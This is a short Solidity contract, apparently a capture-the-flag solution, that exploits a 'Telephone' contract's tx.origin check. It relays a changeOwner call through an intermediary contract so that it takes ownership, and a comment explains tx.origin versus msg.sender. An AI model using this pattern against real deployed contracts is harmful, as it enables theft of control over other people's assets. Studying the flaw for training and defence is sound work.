// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Telephone.sol";

// The tx.origin global variable refers to the original external
// account that started the transaction while msg.sender refers to the
// immediate account (it could be external or another contract account)
// that invokes the function. The tx.origin variable will always refer to
// the external account while msg.sender can be a contract or external account.
// If there are multiple function invocations on multiple contracts,
// tx.origin will always refer to the account that started the transaction
// irrespective of the stack of contracts invoked

contract Test {
    Telephone public telephone;

    constructor(address telephoneContractAddress) public {
        telephone = Telephone(telephoneContractAddress);
    }

    function forwardTransaction(address newOwner) public {
        telephone.changeOwner(newOwner);
    }
}
